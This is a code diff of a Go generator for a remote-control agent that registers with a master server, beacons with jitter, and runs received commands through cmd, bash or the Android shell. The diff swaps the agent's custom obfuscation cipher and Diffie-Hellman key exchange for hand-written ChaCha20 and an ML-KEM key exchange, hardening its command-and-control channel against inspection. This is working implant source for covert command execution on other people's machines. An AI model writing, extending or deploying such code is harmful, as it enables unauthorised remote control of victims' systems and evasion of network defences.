@@ -3,11 +3,11 @@ import (
 	"regexp"
 )
 func Generate_agent(protocol, os, server, Path, ConnPath, MsgPath,
-	switch_key,encry_key,download,result,_net,
+	switch_key,download,result,_net,
     info,upload,list,option,Username,uid,hostname,
 	keyPart,filekey,code,base_rounds,windows_pro string) string {
 	//如果参数有一个为空
-    if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || encry_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || Username == "" || uid == "" || hostname == "" || keyPart == "" || filekey == "" || code == "" || base_rounds == "" {
+    if protocol == "" || os == "" || server == "" || Path == "" || ConnPath == "" || MsgPath == "" || switch_key == "" || download == "" || result == "" || _net == "" || info == "" || upload == "" || list == "" || option == "" || Username == "" || uid == "" || hostname == "" || keyPart == "" || filekey == "" || code == "" || base_rounds == "" {
         return "parameter null"
     }
     var protocol_str, os_str, main_str, sys_str, tls_str,package_str,send,scan_str,scan_func,inithttp,prototime,protocol_var,protocol_var1,header string
@@ -536,6 +536,7 @@ func send() { //发送头部信息
     package /*package_str*/
     import (
         "bytes"
+        "crypto/mlkem"
         crand "crypto/rand"
         "math/big"
         "io"
@@ -550,7 +551,7 @@ func send() { //发送头部信息
         "strconv"
         "sync"
         "path/filepath"
-        "math/bits"
+        "encoding/binary"
         /*sys_str*/
         /*tls_str*/
         /*http3*/
@@ -570,7 +571,7 @@ func send() { //发送头部信息
         onece bool = true
         user string = /*Username*/
         master string = /*server*/
-        key string
+        key []byte
         /*header*/
         /*protocol_var1*/
         client *http.Client
@@ -952,117 +953,98 @@ func send() { //发送头部信息
         return strings.Join(ips, ",")
     }
     /*send*/
-    type ObfConst struct {
-        A byte
-        B byte
-        C byte
-        D byte
-        E byte
-        F byte
+    func rotl(x uint32, n uint) uint32 { return (x << n) | (x >> (32 - n))}
+    func quarterRound(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {a += b; d ^= a; d = rotl(d, 16); c += d; b ^= c; b = rotl(b, 12); a += b; d ^= a; d = rotl(d, 8); c += d; b ^= c; b = rotl(b, 7); return a, b, c, d}
+    func initializeState(counter uint32, nonce [12]byte) [16]uint32 {
+        return [16]uint32{
+            0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
+            binary.LittleEndian.Uint32(key[0:4]),
+            binary.LittleEndian.Uint32(key[4:8]),
+            binary.LittleEndian.Uint32(key[8:12]),
+            binary.LittleEndian.Uint32(key[12:16]),
+            binary.LittleEndian.Uint32(key[16:20]),
+            binary.LittleEndian.Uint32(key[20:24]),
+            binary.LittleEndian.Uint32(key[24:28]),
+            binary.LittleEndian.Uint32(key[28:32]),
+            counter,
+            binary.LittleEndian.Uint32(nonce[0:4]),
+            binary.LittleEndian.Uint32(nonce[4:8]),
+            binary.LittleEndian.Uint32(nonce[8:12]),
+        }
     }
-	func updateState(a, b, c, x, y, z byte, rotate int) (byte, byte, byte) {
-		v := uint32(a)<<24 | uint32(b)<<16 | uint32(c)<<8 | uint32(x)
-		v += uint32(y)<<8 | uint32(z)
-		v = bits.RotateLeft32(v, rotate)
-		v ^= uint32(c)<<24 | uint32(a)<<16
-		return byte(v >> 24),byte(v >> 16),byte(v >> 8)
-	}
-    func ObfuscateBySteps(data []byte, k ObfConst) []byte {
-        if len(data)==0 {
-            return data
+    func chacha20Block(counter uint32, nonce [12]byte) [64]byte {
+        state := initializeState(counter, nonce)
+        working := state
+        for i := 0; i < 10; i++ {
+            working[0], working[4], working[8], working[12] = quarterRound(working[0], working[4], working[8], working[12])
+            working[1], working[5], working[9], working[13] = quarterRound(working[1], working[5], working[9], working[13])
+            working[2], working[6], working[10], working[14] = quarterRound(working[2], working[6], working[10], working[14])
+            working[3], working[7], working[11], working[15] = quarterRound(working[3], working[7], working[11], working[15])
+            working[0], working[5], working[10], working[15] = quarterRound(working[0], working[5], working[10], working[15])
+            working[1], working[6], working[11], working[12] = quarterRound(working[1], working[6], working[11], working[12])
+            working[2], working[7], working[8], working[13] = quarterRound(working[2], working[7], working[8], working[13])
+            working[3], working[4], working[9], working[14] = quarterRound(working[3], working[4], working[9], working[14])
         }
-        if len(data)<3 {
-            for i:=range data {
-                data[i] ^= k.A ^ k.B | k.C
-            }
-            return data
-        }
-        n := len(data) / 3
-        remainder := len(data) % 3
-        at := func(r, c int) *byte {
-            return &data[r*n+c]
-        }
-        prev0 := k.A
-        prev1 := k.B
-        prev2 := k.C
-        for col := 0; col < n; col++ {
-            colIndex := col + 1
-            if colIndex%2 == 0 {
-                *at(0,col) = (*at(0,col) | prev0) ^ k.A
-                *at(2,col) = prev1 ^ *at(2,col) ^ k.B
-                *at(1,col) = prev2 ^ *at(1,col) | k.C
-                prev0 = *at(0,col)
-                prev1 = *at(1,col)
-                prev2 = *at(2,col)
-                k.A,k.B,k.C = updateState(k.A,k.B,k.C, prev0, prev1, prev2, 7)
-            } else {
-                *at(1,col) = (prev0 ^ *at(1,col)) | k.D
-                *at(0,col) = prev1 ^ (*at(0,col) ^ k.E)
-                *at(2,col) = (*at(2,col) | prev2) ^ k.F
-                prev0 = *at(0,col)
-                prev1 = *at(1,col)
-                prev2 = *at(2,col)
-                k.D,k.E,k.F = updateState(k.D,k.E,k.F, prev0, prev1, prev2, 11)
-            }
-        }
-        if remainder > 0 { start := 3*n;for i:=start; i<len(data); i++ { data[i] ^= data[i-1] ^ k.A | k.B } }
-        return data
-    }
-    func randomSalt6() (ObfConst, []byte) {
-        var s [6]byte
-        _, _ = io.ReadFull(crand.Reader, s[:])
-        return ObfConst{A: s[0],B: s[1],C: s[2],D: s[3],E: s[4],F: s[5],}, s[:]
-    }
-    func Encrypt(plain []byte) []byte {
-        if len(plain) == 0 || len(key) == 0 {
-            return nil
-        }
-        obfKey, salt := randomSalt6()
-        sin := (int(key[1024%len(key)])*len(plain)^1024)%len(key)
-        ofkeyLen := len(key)-sin
-        if ofkeyLen > len(plain) {
-            ofkeyLen = len(plain)
-        }
-        ofkey := append([]byte{}, key[sin:sin+ofkeyLen]...)
-        fuscateKey := ObfuscateBySteps(ofkey, obfKey)
-        if len(fuscateKey)==0 {
-            return nil
-        }
-        out:=make([]byte,len(plain))
-        for i:=range plain {
-            out[i]=plain[i]^fuscateKey[i%len(fuscateKey)]
-        }
-        return append(out,salt...)
-    }
-    func Decrypt(cipher []byte) []byte {
-        if len(cipher)<6 || len(key)==0 {
-            return nil
-        }
-        data:=cipher[:len(cipher)-6]
-        salt:=cipher[len(cipher)-6:]
-        obfKey:=ObfConst{
-            A:salt[0],
-            B:salt[1],
-            C:salt[2],
-            D:salt[3],
-            E:salt[4],
-            F:salt[5],
-        }
-        sin:=(int(key[1024%len(key)])*len(data)^1024)%len(key)
-        ofkeyLen:=len(key)-sin
-        if ofkeyLen>len(data){
-            ofkeyLen=len(data)
-        }
-        ofkey:=append([]byte{},key[sin:sin+ofkeyLen]...)
-        fuscateKey:=ObfuscateBySteps(ofkey,obfKey)
-        if len(fuscateKey)==0{
-            return nil
-        }
-        out:=make([]byte,len(data))
-        for i:=range data{
-            out[i]=data[i]^fuscateKey[i%len(fuscateKey)]
+        var out [64]byte
+        for i := 0; i < 16; i++ {
+            working[i] += state[i]
+            binary.LittleEndian.PutUint32(out[i*4:], working[i])
         }
         return out
+    }
+    func ChaCha20Encrypt(data []byte,key [32]byte, nonce [12]byte, counter uint32) []byte {
+        out := make([]byte, len(data))
+        for i := 0; i < len(data); i += 64 {
+            block := chacha20Block(counter, nonce)
+            n := len(data) - i
+            if n > 64 {
+                n = 64
+            }
+            for j := 0; j < n; j++ {
+                out[i+j] = data[i+j] ^ block[j]
+            }
+            counter++
+        }
+        return out
+    }
+    func chachaEncrypt(input []byte) []byte {
+        var chaKey [32]byte
+        copy(chaKey[:], key)
+        var nonce [12]byte
+        if _, err := crand.Read(nonce[:]); err != nil {
+            return nil
+        }
+        cipher := ChaCha20Encrypt(input, chaKey, nonce, 0)
+        out := make([]byte, 12+len(cipher))
+        copy(out[:12], nonce[:])
+        copy(out[12:], cipher)
+        return out
+    }
+
+    func chachaDecrypt(input []byte) []byte {
+        if len(input) < 12 {
+            return nil
+        }
+        var chaKey [32]byte
+        copy(chaKey[:], key)
+        var nonce [12]byte
+        copy(nonce[:], input[:12])
+        cipher := input[12:]
+        return ChaCha20Encrypt(cipher, chaKey, nonce, 0)
+    }
+    //加密
+    func Encrypt(input []byte) []byte {
+        if len(input) == 0 {
+            return nil
+        }
+        return chachaEncrypt(input)
+    }
+    //解密
+    func Decrypt(input []byte) []byte {
+        if len(input) == 0 {
+            return nil
+        }
+        return chachaDecrypt(input)
     }
     func get_decry_f(filepath string, data []byte) error {
 		if len(data) == 0 {
@@ -1172,148 +1154,41 @@ func send() { //发送头部信息
         }
         return string(result)
     }
-    func leftPadBytes(b []byte, size int) []byte {if len(b) >= size {return b};out := make([]byte, size);copy(out[size-len(b):], b);return out}
-    func decryptString(key string, sharedKey []byte) string {
-        if key == "null" || len(sharedKey) == 0 {
-            return key
-        }
-        sharedKey = leftPadBytes(sharedKey, 7)
-        clientKey := []byte(key)
-        sharedLen := len(sharedKey)
-        var obfKey []byte
-        var obfConst ObfConst
-        last6 := sharedKey[sharedLen-6:]
-        prefix := sharedKey[:sharedLen-6]
-        pLen := len(prefix)
-        cLen := len(clientKey)
-        newKey := make([]byte, 0, pLen+cLen)
-        base := cLen / (pLen + 1)
-        rem := cLen % (pLen + 1)
-        ci := 0
-        for i := 0; i < pLen; i++ {
-            segLen := base
-            if i < rem {
-                segLen++
-            }
-            for j := 0; j < segLen && ci < cLen; j++ {
-                newKey = append(newKey, clientKey[ci])
-                ci++
-            }
-            newKey = append(newKey, byte(prefix[i]))
-        }
-        for ci < cLen {
-            newKey = append(newKey, clientKey[ci])
-            ci++
-        }
-        obfKey = newKey
-        obfConst = ObfConst{
-            A: byte(last6[0]),
-            B: byte(last6[1]),
-            C: byte(last6[2]),
-            D: byte(last6[3]),
-            E: byte(last6[4]),
-            F: byte(last6[5]),
-        }
-        result := ObfuscateBySteps(obfKey, obfConst)
-        return string(result)
-    }
-    func onlyHex(s string) string {
-        out := make([]rune, 0, len(s))
-        for _, c := range s {
-            if (c >= '0' && c <= '9') ||
-                (c >= 'a' && c <= 'f') ||
-                (c >= 'A' && c <= 'F') {
-                out = append(out, c)
-            }
-        }
-        return string(out)
-    }
-    func randBigInt(max *big.Int) *big.Int {
-        if max == nil || max.Sign() <= 0 {
-            return big.NewInt(0)
-        }
-        n, err := crand.Int(crand.Reader, max)
-        if err != nil {
-            return big.NewInt(0)
-        }
-        return n
-    }
-    func deriveP(raw string) *big.Int {
-        hexStr := onlyHex(raw)
-        pStr := "FFFFFFFFFFFFFFF" + hexStr
-        p, ok := new(big.Int).SetString(pStr, 16)
-        if !ok {
-            return nil
-        }
-        return p
-    }
-    func deriveG(p *big.Int) *big.Int {
-        bits := byte(0)
-        for i := 1024; i < 1032; i++ {
-            bits = bits<<1 + byte(p.Bit(i))
-        }
-        g := big.NewInt(int64(bits))
-        if g.Cmp(big.NewInt(2)) < 0 {
-            g.Add(g, big.NewInt(2))
-        }
-        if g.Cmp(p) >= 0 {
-            g.Mod(g, new(big.Int).Sub(p, big.NewInt(2)))
-            g.Add(g, big.NewInt(2))
-        }
-        return g
-    }
-	func generateAndUpdateKey(url string) []byte {
-		p := deriveP(base_rounds)
-		if p == nil {
-			return nil
-		}
-		g := deriveG(p)
-		b := randBigInt(p)
-		B := new(big.Int).Exp(g, b, p)
+	func generateAndUpdateKey(url string){
 		base_respBody := getUrl(url)
-		decodedBytes := customBase64Decode(base_respBody)
-		if len(decodedBytes) == 0 {
-			return nil
-		}
-		A := new(big.Int).SetBytes(decodedBytes)
-		secyret := new(big.Int).Exp(A, b, p)
-		BBytes := B.Bytes()
-		BBase64 := customBase64Encode(BBytes)
-		key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + BBase64
-		getUrl(key_url)
-		return secyret.Bytes()
-	}
-    func getConn(newKey_map *[]byte) {
-        key = "null"
-        get_keyUrl := protocol + master + "//*Path*/?/*option*/=/*encry_key*/&/*uid*/=" + uid
-        for {
-            a_Mutex.RLock()
-            wait := int(delay)
-            if delay > 30 {
-                n, err := crand.Int(crand.Reader, big.NewInt(int64(jitter+1)))
-                if err != nil {
-                    return
-                }
-                wait += int(n.Int64())
-            }
-            a_Mutex.RUnlock()
-            time.Sleep(time.Duration(wait) * time.Second)
-            base_key_str := getUrl(get_keyUrl)
-            decode_key_str := customBase64Decode(base_key_str)
-            key_str := string(decode_key_str)
-            if len(key_str) >= 1024 {
-                key =  decryptString(key_str,*newKey_map)
-                if key !="null"{
-                    onece = false
-                    return
-                }
-            }
+		serverPubKeyBytes := customBase64Decode(base_respBody)
+		if len(serverPubKeyBytes) != mlkem.EncapsulationKeySize768 {
+            return
         }
-    }
+		serverPubKey, err := mlkem.NewEncapsulationKey768(serverPubKeyBytes)
+		if err != nil {
+			return
+		}
+		sharedKey, ciphertext := serverPubKey.Encapsulate()
+        if len(sharedKey) != mlkem.SharedKeySize || len(ciphertext) != mlkem.CiphertextSize768 {
+            return
+        }
+		ciphertextBase64 := customBase64Encode(ciphertext)
+		key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + ciphertextBase64
+		a_Mutex.RLock();wait := delay;jitterValue := jitter;a_Mutex.RUnlock()
+        if wait < 0 {wait = 0}
+        if wait > 30 && jitterValue > 0 {
+            n, err := crand.Int(crand.Reader,big.NewInt(int64(jitterValue)+1),);
+            if err != nil {
+                return
+            }
+            wait += int(n.Int64())
+        }
+        time.Sleep(time.Duration(wait) * time.Second)
+        getUrl(key_url)
+        key = sharedKey
+        onece = false
+	}
     func run() {
         if onece {
             a_Mutex.Lock();decodeMap = buildDecodeMap();a_Mutex.Unlock()
             if uid == "" {uid = generateUUID()}
+            key = nil
             initHttpClient()
             if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
             clientname = strings.TrimSpace(Command("hostname"))
@@ -1321,14 +1196,11 @@ func send() { //发送头部信息
             get_headers["Host"] = master
             client_b := customBase64Encode([]byte(clientname))
             url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*hostname*/=" + client_b
-            newKey_map:= generateAndUpdateKey(url)
             for {
-                getConn(&newKey_map)
-                if !onece && key != "null" && len(key) > 1024 {
+                generateAndUpdateKey(url)
+                if !onece && len(key) == 32 {
                     send()
                     getCmd()
-                } else {
-                    continue
                 }
             }
         }else{getCmd()}
@@ -1350,7 +1222,6 @@ func send() { //发送头部信息
 		`/\*MsgPath\*/`:           MsgPath,
         `/\*package_str\*/`:       package_str,
         `/\*switch_key\*/`:        switch_key,
-        `/\*encry_key\*/`:         encry_key,
         `/\*download\*/`:          download,
         `/\*result\*/`:            result,
         `/\*_net\*/`:              _net,
